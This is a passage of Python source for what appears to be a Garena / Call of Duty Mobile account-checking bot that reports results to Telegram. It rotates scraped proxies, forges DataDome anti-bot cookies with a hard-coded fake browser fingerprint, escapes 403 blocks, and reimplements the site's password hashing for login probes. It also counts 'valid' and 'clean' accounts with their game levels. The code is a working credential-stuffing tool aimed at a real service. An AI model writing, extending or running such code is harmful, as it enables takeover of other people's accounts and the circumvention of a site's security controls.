                    except Exception:
                        continue
                    if not normalized:
                        continue
                    if normalized in seen:
                        dupes += 1
                        continue
                    seen.add(normalized)
                    all_normalized.append(normalized)
                    source_new += 1

                total_dupes += dupes
                total_new += source_new

            # ── Full rewrite: replace the entire file with fresh proxies ──
            # This ensures dead/stale proxies from previous cycles are removed.
            if all_normalized:
                try:
                    os.makedirs(PROXY_FOLDER, exist_ok=True)
                    with open(RAW_PROXY_SAVE_FILE, "w", encoding="utf-8") as f:
                        f.write("# Auto-fetched proxies — do not edit manually\n")
                        for p in all_normalized:
                            f.write(p + "\n")
                    log.info(f"[RAW-PROXY] Full rewrite: {len(all_normalized)} proxies written to {RAW_PROXY_SAVE_FILE}")
                except OSError as e:
                    log.error(f"[RAW-PROXY] Failed to write {RAW_PROXY_SAVE_FILE}: {e}")

            if total_new > 0:
                try:
                    with geo_rotator._lock:
                        geo_rotator._load_all_files()
                    _touch_liveness()  # proxy fetch is alive
                    pool_now = geo_rotator.total
                    if pool_now > 0:
                        log.info(f"[RAW-PROXY] Pool reloaded successfully: {pool_now} proxies")
                    else:
                        log.warning(f"[RAW-PROXY] Pool still 0 after reload — checking save file...")
                        if os.path.exists(RAW_PROXY_SAVE_FILE):
                            with open(RAW_PROXY_SAVE_FILE, "r", encoding="utf-8", errors="ignore") as f:
                                file_lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
                            log.warning(f"[RAW-PROXY] Save file has {len(file_lines)} lines, pool={pool_now}")
                        else:
                            log.error(f"[RAW-PROXY] Save file {RAW_PROXY_SAVE_FILE} does not exist!")
                except Exception as e:
                    log.error(f"[RAW-PROXY] Failed to reload proxy pool: {e}", exc_info=True)

                # Auto-resume proxy-paused users if proxies are now available
                try:
                    if _proxy_paused_users:
                        _resume_proxy_paused_users(BOT_TOKEN)
                except Exception:
                    pass

                # Persist fetched proxies to saved_proxies/ + KeyVault API
                try:
                    _persist_proxies()
                except Exception:
                    pass

                log.info(f"[RAW-PROXY] +{total_new} new proxies added "
                         f"(fetched {total_fetched}, {total_dupes} dupes) | pool now: {geo_rotator.total}")
            else:
                log.debug(f"[RAW-PROXY] No new proxies this cycle "
                          f"(fetched {total_fetched}, {total_dupes} dupes)")

        except Exception as e:
            log.error(f"[RAW-PROXY] Error in fetch cycle: {e}", exc_info=True)

        # Wait for next cycle (interruptible by shutdown)
        shutdown_event.wait(RAW_PROXY_FETCH_INTERVAL)

def signal_handler(signum, frame):
    """Handle SIGINT (Ctrl+C) and SIGTERM (process manager shutdown) gracefully."""
    sig_name = "SIGTERM" if signum == signal.SIGTERM else "SIGINT"
    shutdown_event.set()   # signal all polling loops and checkers to stop
    print(f"\n  ⚠️  {sig_name} received — shutting down gracefully...")
    # Don't call os._exit(0) — it bypasses Python cleanup and can look like a crash.
    # Instead, let the main loop detect shutdown_event and exit cleanly.
    # Give threads up to 3 seconds to finish current work, then raise SystemExit
    time.sleep(1)
    raise SystemExit(0)

# Register both SIGINT (Ctrl+C) and SIGTERM (Wispbyte/systemd kill)
signal.signal(signal.SIGINT,  signal_handler)
signal.signal(signal.SIGTERM, signal_handler) 

class Colors:
    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
    LIGHTCYAN_EX = colorama.Fore.LIGHTCYAN_EX
    LIGHTYELLOW_EX = colorama.Fore.LIGHTYELLOW_EX
    LIGHTRED_EX = colorama.Fore.LIGHTRED_EX
    LIGHTBLUE_EX = colorama.Fore.LIGHTBLUE_EX
    LIGHTWHITE_EX = colorama.Fore.LIGHTWHITE_EX
    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
    WHITE = colorama.Fore.WHITE
    BLUE = colorama.Fore.BLUE
    GREEN = colorama.Fore.GREEN
    RED = colorama.Fore.RED
    CYAN = colorama.Fore.CYAN
    YELLOW = colorama.Fore.YELLOW
    MAGENTA = colorama.Fore.MAGENTA
    RESET = colorama.Style.RESET_ALL

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
        'ORANGE': '\033[38;5;214m',
        'PURPLE': '\033[95m',
        'CYAN': '\033[96m',
        'SUCCESS': '\033[92m',
        'FAIL': '\033[91m'
    }

    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)

logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)   

class GracefulThreadPoolExecutor(ThreadPoolExecutor):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._shutdown = False
        
    def shutdown(self, wait=True, *, cancel_futures=False):
        self._shutdown = True
        super().shutdown(wait=wait, cancel_futures=cancel_futures)

class CookieManager:
    COOKIE_MAX_LINES = 1000   # auto-delete threshold
    COOKIE_KEEP      = 100    # keep 100 newest cookies after cleanup (delete 900)

    def __init__(self):
        self.banned_cookies = set()
        self._cookie_lock = threading.Lock()
        self.load_banned_cookies()
        # Auto-trim on startup if file already exceeds limit
        self._auto_trim_cookies()
        
    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')

    def _auto_trim_cookies(self):
        """Auto-delete 999 oldest cookies when file reaches 1000 lines. Keep only newest."""
        with self._cookie_lock:
            if not os.path.exists('fresh_cookie.txt'):
                return
            try:
                with open('fresh_cookie.txt', 'r') as f:
                    lines = [l.strip() for l in f if l.strip()]
                if len(lines) >= self.COOKIE_MAX_LINES:
                    keep = lines[-self.COOKIE_KEEP:]   # keep the newest 100 cookies
                    deleted = len(lines) - len(keep)
                    with open('fresh_cookie.txt', 'w') as f:
                        f.write('\n'.join(keep) + '\n')
                    logger.info(f"[COOKIE] 🗑️ Auto-deleted {deleted} old cookies (kept {len(keep)} newest)")
            except Exception as e:
                logger.warning(f"[COOKIE] ⚠️ Error trimming cookies: {e}")
    
    def get_valid_cookies(self): 
        valid_cookies = []
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                valid_cookies = [c.strip() for c in f.read().splitlines() 
                               if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid_cookies)
        return valid_cookies
    
    def save_cookie(self, datadome_value):
        formatted_cookie = f"datadome={datadome_value.strip()}" 
        if not self.is_banned(formatted_cookie):
            with self._cookie_lock:
                existing_cookies = set()
                if os.path.exists('fresh_cookie.txt'):
                    with open('fresh_cookie.txt', 'r') as f:
                        existing_cookies = set(line.strip() for line in f if line.strip())
                        
                if formatted_cookie not in existing_cookies:
                    with open('fresh_cookie.txt', 'a') as f:
                        f.write(formatted_cookie + '\n')
                    # Check if we hit the 1K threshold after adding
                    cookie_count = len(existing_cookies) + 1
                    if cookie_count >= self.COOKIE_MAX_LINES:
                        self._auto_trim_cookies()
                    return True
                return False 
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        self._cookie_timestamp = 0  # When the current cookie was obtained
        self._cookie_max_age = 300   # Cookies expire after 5 minutes
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            self._cookie_timestamp = time.time()
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            
    def get_datadome(self):
        return self.current_datadome
    
    def is_cookie_stale(self):
        """Check if the current DataDome cookie might be expired."""
        if not self.current_datadome:
            return True
        return (time.time() - self._cookie_timestamp) > self._cookie_max_age
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            logger.warning(f"[WARNING] Error extracting datadome from session: {e}")
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            logger.warning(f"[WARNING] Error clearing datadome cookies: {e}")
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
            return False

    def refresh_datadome(self, session):
        """Force-fetch a fresh DataDome cookie through the session's current proxy.
        Returns True if a new cookie was obtained."""
        try:
            fresh_dd = get_datadome_cookie(session)
            if fresh_dd:
                self.set_datadome(fresh_dd)
                self.set_session_datadome(session, fresh_dd)
                logger.info(f"[DD] 🍪 Fresh DataDome cookie obtained via proxy")
                return True
            else:
                logger.warning(f"[DD] ⚠️ Failed to get DataDome cookie from current proxy")
                return False
        except Exception as e:
            logger.warning(f"[DD] ⚠️ Error refreshing DataDome: {e}")
            return False

    def handle_403(self, session, telegram_config=None):
        """On 403 — try DataDome refresh first, then proxy rotation.
        
        Recovery strategy (in order):
        1. If cookie is stale or missing → try refreshing DataDome on current proxy
        2. Force-rotate proxy + get fresh DataDome
        3. Smart-rotate proxy + get fresh DataDome  
        4. If no proxies available, try direct connection with fresh DataDome
        """
        self._403_attempts += 1

        logger.warning(f"[403] 🚫 Access denied (attempt #{self._403_attempts})")

        # ── Step 1: Try refreshing DataDome on current proxy first ──
        if self.is_cookie_stale() or not self.current_datadome:
            logger.info(f"[403] 🔄 Cookie stale/missing — refreshing DataDome on current proxy...")
            if self.refresh_datadome(session):
                self._403_attempts = 0
                logger.info(f"[403] ✅ Recovered with fresh DataDome (same proxy)")
                return True

        # ── Step 2: Try up to 5 proxy rotations for recovery ──
        max_rotations = min(5, max(3, geo_rotator.total // 10))  # Scale with pool size
        for rot_attempt in range(max_rotations):
            try:
                if rot_attempt == 0:
                    new_proxy = geo_rotator.force_rotate()
                else:
                    new_proxy = geo_rotator.smart_rotate()
                    
                if not new_proxy:
                    logger.warning(f"[403] ⚠️ No proxy available for rotation (pool empty)")
                    break
                    
                session.proxies.update(geo_rotator.get_proxies())
                logger.info(f"[403] 🔄 Rotated → {new_proxy}")

                # Try getting fresh DataDome through new proxy
                if self.refresh_datadome(session):
                    self._403_attempts = 0
                    logger.info(f"[403] ✅ Fresh DataDome + new proxy: {new_proxy}")
                    return True
                    
            except Exception as e:
                logger.warning(f"[403] ⚠️ Rotation attempt {rot_attempt+1} failed: {e}")

        # ── Step 3: Last resort — try direct connection (no proxy) with fresh DataDome ──
        if geo_rotator.total > 0:
            logger.warning(f"[403] 🔄 All proxies exhausted — trying direct connection...")
            session.proxies.clear()
            if self.refresh_datadome(session):
                self._403_attempts = 0
                logger.info(f"[403] ✅ Direct connection + fresh DataDome works!")
                # Restore proxy for subsequent requests
                session.proxies.update(geo_rotator.get_proxies())
                return True
            # Restore proxy even on failure
            session.proxies.update(geo_rotator.get_proxies())

        logger.error(f"[403] ❌ Failed to recover after {max_rotations} rotations — skipping account")
        return False

class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.total_processed = 0
        self.lock = threading.Lock()
        # Progress tracking fields
        self.start_time = None
        self.last_update_time = None
        self.last_processed_count = 0
        self.current_speed = 0.0  # accounts per second
        self.eta_seconds = None
        self.total_accounts = 0
        # Level distribution tracking
        self.level_distribution = {
            "1-50": 0, "51-100": 0, "101-150": 0, "151-200": 0,
            "201-250": 0, "251-300": 0, "301-350": 0, "351+": 0
        }
        # Server/region distribution tracking
        self.server_distribution = {}
        # Country distribution tracking
        self.country_distribution = {}

    def start_tracking(self, total_accounts):
        """Initialize progress tracking with total account count."""
        with self.lock:
            self.start_time = time.time()
            self.last_update_time = self.start_time
            self.last_processed_count = 0
            self.total_accounts = total_accounts
            self.current_speed = 0.0
            self.eta_seconds = None

    def update_stats(self, valid=False, clean=False, has_codm=False, codm_level=0, region="", country=""):
        with self.lock:
            self.total_processed += 1

            if valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                else:
                    self.not_clean_count += 1
                if has_codm:
                    self.has_codm_count += 1
                    # Track level distribution
                    try:
                        lvl = int(codm_level) if codm_level else 0
                    except (ValueError, TypeError):
                        lvl = 0
                    if lvl > 0:
                        if lvl <= 50: self.level_distribution["1-50"] += 1
                        elif lvl <= 100: self.level_distribution["51-100"] += 1
                        elif lvl <= 150: self.level_distribution["101-150"] += 1
                        elif lvl <= 200: self.level_distribution["151-200"] += 1
                        elif lvl <= 250: self.level_distribution["201-250"] += 1
                        elif lvl <= 300: self.level_distribution["251-300"] += 1
                        elif lvl <= 350: self.level_distribution["301-350"] += 1
                        else: self.level_distribution["351+"] += 1
                    # Track server/region distribution
                    if region and region not in ('N/A', '', 'NONE', 'NULL'):
                        r = region.upper().strip()
                        self.server_distribution[r] = self.server_distribution.get(r, 0) + 1
                    # Track country distribution
                    if country and country not in ('N/A', '', 'NONE', 'NULL'):
                        c = country.upper().strip()
                        self.country_distribution[c] = self.country_distribution.get(c, 0) + 1
                else:
                    self.no_codm_count += 1
            else:
                self.invalid_count += 1

            # Calculate speed and ETA every 5 accounts
            now = time.time()
            if self.start_time and self.total_processed % 5 == 0:
                elapsed_since_start = now - self.start_time
                if elapsed_since_start > 0:
                    self.current_speed = self.total_processed / elapsed_since_start
                time_since_last = now - self.last_update_time
                if time_since_last > 0:
                    delta = self.total_processed - self.last_processed_count
                    instant_speed = delta / time_since_last
                    # Smooth the speed using weighted average
                    self.current_speed = (0.3 * instant_speed) + (0.7 * self.current_speed)
                if self.current_speed > 0 and self.total_accounts > 0:
                    remaining = self.total_accounts - self.total_processed
                    self.eta_seconds = remaining / self.current_speed
                else:
                    self.eta_seconds = None
                self.last_update_time = now
                self.last_processed_count = self.total_processed

    def should_display(self):
        """Returns True if stats should be displayed (every 20 checks)"""
        with self.lock:
            return self.total_processed % 20 == 0

    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'clean': self.clean_count,
                'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count,
                'no_codm': self.no_codm_count,
                'total': self.total_processed,
                'speed': round(self.current_speed, 2),
                'eta': self.eta_seconds,
                'total_accounts': self.total_accounts,
                'elapsed': time.time() - self.start_time if self.start_time else 0,
                'level_distribution': dict(self.level_distribution),
                'server_distribution': dict(self.server_distribution),
                'country_distribution': dict(self.country_distribution),
            }

    def get_progress_bar(self, width=30):
        """Generate a visual progress bar string."""
        with self.lock:
            if self.total_accounts <= 0:
                return ""
            pct = self.total_processed / self.total_accounts
            filled = int(width * pct)
            bar = "█" * filled + "░" * (width - filled)
            return f"[{bar}] {pct * 100:.1f}%"

    def format_time(self, seconds):
        """Format seconds into human-readable time string."""
        if seconds is None or seconds < 0:
            return "N/A"
        seconds = int(seconds)
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        secs = seconds % 60
        if hours > 0:
            return f"{hours}h {minutes}m {secs}s"
        elif minutes > 0:
            return f"{minutes}m {secs}s"
        else:
            return f"{secs}s"

    def display_stats(self):
        stats = self.get_stats()

        # Color codes
        cyan = '\033[1;96m'
        white = '\033[1;37m'
        green = '\033[1;92m'
        red = '\033[1;91m'
        blue = '\033[1;94m'
        magenta = '\033[1;95m'
        yellow = '\033[1;93m'
        gray = '\033[90m'
        reset = '\033[0m'

        # Calculate success rate
        success_rate = (stats['valid'] / stats['total'] * 100) if stats['total'] > 0 else 0

        # Build progress section
        progress_section = ""
        if stats['total_accounts'] > 0:
            pct = stats['total'] / stats['total_accounts']
            filled = int(30 * pct)
            bar = "█" * filled + "░" * (30 - filled)
            speed_str = f"{stats['speed']:.1f}/s" if stats['speed'] > 0 else "calculating..."
            eta_str = self.format_time(stats['eta']) if stats['eta'] else "N/A"
            elapsed_str = self.format_time(stats['elapsed'])
            progress_section = (
                f"{cyan}║{reset}  {yellow}Progress:{reset} [{green}{bar}{reset}] {pct*100:.1f}%   {cyan}║{reset}\n"
                f"{cyan}║{reset}  {white}Speed: {magenta}{speed_str}{reset} {gray}│{reset} {white}ETA: {blue}{eta_str}{reset} {gray}│{reset} {white}Elapsed: {green}{elapsed_str}{reset}  {cyan}║{reset}\n"
                f"{cyan}╠══════════════════════════════════════════════════════════════════╣{reset}\n"
            )

        return (
            f"\n{cyan}╔══════════════════════════════════════════════════════════════════╗{reset}\n"
            f"{cyan}║{reset}  {yellow}LIVE STATISTICS{reset} {gray}|{reset} {white}TyraCutiee - @Yukiii_ii{reset}                       {cyan}║{reset}\n"
            f"{cyan}╠══════════════════════════════════════════════════════════════════╣{reset}\n"
            f"{progress_section}"
            f"{cyan}║{reset}  {white}Processed: {magenta}{stats['total']:>4}{reset} {gray}│{reset} "
            f"{white}Success Rate: {green if success_rate >= 50 else red}{success_rate:>5.1f}%{reset}                   {cyan}║{reset}\n"
            f"{cyan}╠══════════════════════════════════════════════════════════════════╣{reset}\n"
            f"{cyan}║{reset}  {green}Valid: {stats['valid']:>4}{reset} {gray}│{reset} "
            f"{red}Invalid: {stats['invalid']:>4}{reset} {gray}│{reset} "
            f"{blue}Clean: {stats['clean']:>4}{reset} {gray}│{reset} "
            f"{yellow}Not Clean: {stats['not_clean']:>4}{reset}  {cyan}║{reset}\n"
            f"{cyan}║{reset}  {magenta}CODM: {stats['has_codm']:>4}{reset} {gray}│{reset} "
            f"{gray}No CODM: {stats['no_codm']:>4}{reset}                                  {cyan}║{reset}\n"
            f"{cyan}╚══════════════════════════════════════════════════════════════════╝{reset}\n"
            f"  {gray}Created by: {white}@Yukiii_ii{reset}\n"
        )

    def _make_bar(self, value, total, width=10):
        """Generate a text progress bar like [███████░░░]"""
        if total <= 0:
            return "░" * width
        filled = int(width * value / total)
        return "█" * filled + "░" * (width - filled)

    def get_telegram_progress(self):
        """Get progress info formatted for Telegram messages — basic version."""
        with self.lock:
            if self.total_accounts <= 0:
                return None
            pct = self.total_processed / self.total_accounts
            speed_str = f"{self.current_speed:.1f}/s" if self.current_speed > 0 else "calculating..."
            eta_str = self.format_time(self.eta_seconds) if self.eta_seconds else "N/A"
            elapsed_str = self.format_time(time.time() - self.start_time) if self.start_time else "0s"
            success_rate = (self.valid_count / self.total_processed * 100) if self.total_processed > 0 else 0
            remaining = self.total_accounts - self.total_processed
            return (
                f"📊 *Progress:* {pct*100:.1f}% ({self.total_processed}/{self.total_accounts})\n"
                f"⏱ *Speed:* {speed_str} | *ETA:* {eta_str}\n"
                f"🕐 *Elapsed:* {elapsed_str}\n"
                f"✅ *Valid:* {self.valid_count} | ❌ *Invalid:* {self.invalid_count}\n"
                f"📈 *Success Rate:* {success_rate:.1f}% | *Remaining:* {remaining}"
            )

    def get_fancy_telegram_progress(self):
        """Get the fancy checking display for Telegram with bars, stats, level & server distribution."""
        with self.lock:
            if self.total_accounts <= 0:
                return None

            pct = self.total_processed / self.total_accounts
            pct_int = int(pct * 100)
            bar = self._make_bar(self.total_processed, self.total_accounts, 10)

            lines = [
                f"⚡️ Checking…",
                f"━━━━━━━━━━━━━━━━━━━━",
                f"⏳ [{bar}] {pct_int}%  {self.total_processed:,}/{self.total_accounts:,}",
                f"━━━━━━━━━━━━━━━━━━━━",
                f"✅ Valid      : {self.valid_count:,}",
                f"❌ Invalid    : {self.invalid_count:,}",
                f"✨ Clean      : {self.clean_count:,}",
                f"⚠️  Not Clean  : {self.not_clean_count:,}",
                f"🎮 Has CODM   : {self.has_codm_count:,}",
                f"📭 No CODM    : {self.no_codm_count:,}",
                f"━━━━━━━━━━━━━━━━━━━━",
            ]

            # Level Distribution (only if we have CODM data)
            total_with_level = sum(self.level_distribution.values())
            if total_with_level > 0:
                lines.append(f"━━━━━━━━━━━━━━━━━━━━")
                lines.append(f"📊 Level Distribution")
                for range_key in ["1-50", "51-100", "101-150", "151-200",
                                  "201-250", "251-300", "301-350", "351+"]:
                    count = self.level_distribution[range_key]
                    pct_lvl = (count / total_with_level * 100) if total_with_level > 0 else 0
                    bar_lvl = self._make_bar(count, total_with_level, 10)
                    lines.append(f"  {range_key:<7} : [{bar_lvl}] {count} ({pct_lvl:.1f}%)")
                lines.append(f"━━━━━━━━━━━━━━━━━━━━")

            # Server Distribution (only if we have region data)
            if self.server_distribution:
                lines.append(f"🌏 Server Distribution")
                sorted_servers = sorted(self.server_distribution.items(), key=lambda x: x[1], reverse=True)
                total_servers = sum(v for _, v in sorted_servers)
                for region, count in sorted_servers:
                    pct_srv = (count / total_servers * 100) if total_servers > 0 else 0
                    bar_srv = self._make_bar(count, total_servers, 10)
                    lines.append(f"  {region:<5} : [{bar_srv}] {count} ({pct_srv:.1f}%)")
                lines.append(f"━━━━━━━━━━━━━━━━━━━━")

            # Country Distribution (only if we have country data)
            if self.country_distribution:
                lines.append(f"🌍 Country Distribution")
                sorted_countries = sorted(self.country_distribution.items(), key=lambda x: x[1], reverse=True)
                total_countries = sum(v for _, v in sorted_countries)
                for cname, count in sorted_countries[:15]:
                    pct_c = (count / total_countries * 100) if total_countries > 0 else 0
                    bar_c = self._make_bar(count, total_countries, 10)
                    lines.append(f"  {cname:<5} : [{bar_c}] {count} ({pct_c:.1f}%)")
                if len(sorted_countries) > 15:
                    others = sum(v for _, v in sorted_countries[15:])
                    lines.append(f"  Other : {others} ({others/total_countries*100:.1f}%)")
                lines.append(f"━━━━━━━━━━━━━━━━━━━━")

            return "\n".join(lines)

    def save_progress(self, filepath="progress_resume.json"):
        """Save current progress state to file for resume capability."""
        with self.lock:
            data = {
                'valid_count': self.valid_count,
                'invalid_count': self.invalid_count,
                'clean_count': self.clean_count,
                'not_clean_count': self.not_clean_count,
                'has_codm_count': self.has_codm_count,
                'no_codm_count': self.no_codm_count,
                'total_processed': self.total_processed,
                'total_accounts': self.total_accounts,
                'current_speed': self.current_speed,
                'saved_at': time.time(),
                'start_time': self.start_time
            }
        try:
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)
            return True
        except Exception:
            return False

    def load_progress(self, filepath="progress_resume.json"):
        """Load progress state from file to resume a previous session."""
        try:
            with open(filepath, 'r') as f:
                data = json.load(f)
            with self.lock:
                self.valid_count = data.get('valid_count', 0)
                self.invalid_count = data.get('invalid_count', 0)
                self.clean_count = data.get('clean_count', 0)
                self.not_clean_count = data.get('not_clean_count', 0)
                self.has_codm_count = data.get('has_codm_count', 0)
                self.no_codm_count = data.get('no_codm_count', 0)
                self.total_processed = data.get('total_processed', 0)
                self.total_accounts = data.get('total_accounts', 0)
                self.current_speed = data.get('current_speed', 0.0)
                self.start_time = data.get('start_time', time.time())
            return True
        except Exception:
            return False


def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value 
            except (ValueError, IndexError):
                logger.warning(f"[WARNING] Skipping invalid cookie component: {item}")
        else:
            logger.warning(f"[WARNING] Skipping malformed cookie (no '='): {item}")
    
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"[SUCCESS] Applied {len(cookie_dict)} unique cookie keys to session.")
    else:
        logger.warning(f"[WARNING] No valid cookies found in the provided string")

def get_datadome_cookie(session, max_retries=3):
    """Fetch a fresh DataDome cookie from dd.garena.com/js/.
    Retries up to max_retries times with proxy rotation on failure."""
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        "jsData": json.dumps({"ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False, "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US", "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True, "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False, "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF", "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably", "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False, "acma": "maybe", "acmats": False, "acaa": "probably", "acaats": True, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False, "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False, "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False, "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True, "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True}),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    for attempt in range(1, max_retries + 1):
        try:
            response = session.post(url, headers=headers, data=data, timeout=8)
            response.raise_for_status()
            response_json = response.json()
            
            if response_json.get('status') == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                datadome = cookie_string.split(';')[0].split('=')[1]
                return datadome
            else:
                _status = response_json.get('status', 'unknown')
                logger.warning(f"[DATADOME] Attempt {attempt}/{max_retries}: API returned status {_status} (no cookie)")
        except requests.exceptions.RequestException as e:
            logger.warning(f"[DATADOME] Attempt {attempt}/{max_retries}: Request failed — {e}")
        
        # Rotate proxy for next attempt (if not the last try)
        if attempt < max_retries:
            try:
                geo_rotator.smart_rotate()
                session.proxies.update(geo_rotator.get_proxies())
            except Exception:
                pass
            time.sleep(0.3 * attempt)  # small backoff

    logger.error(f"[DATADOME] Failed to get DataDome cookie after {max_retries} attempts")
    return None
    
def prelogin(session, account, datadome_manager, telegram_config=None):
    url = 'https://sso.garena.com/api/prelogin'
    
    try:
        account.encode('latin-1')
    except UnicodeEncodeError:
        logger.warning(f"   ⚠️ Skipping: {account} (unsupported characters)")
        return None, None, None
    
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
    # ── Pre-fetch DataDome if stale or missing ──
    if datadome_manager.is_cookie_stale() or not datadome_manager.get_datadome():
        logger.info(f"   🍪 DataDome cookie stale/missing — refreshing before prelogin...")
        datadome_manager.refresh_datadome(session)
    
    retries = 3  # 3 retries (up from 2) for better recovery
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
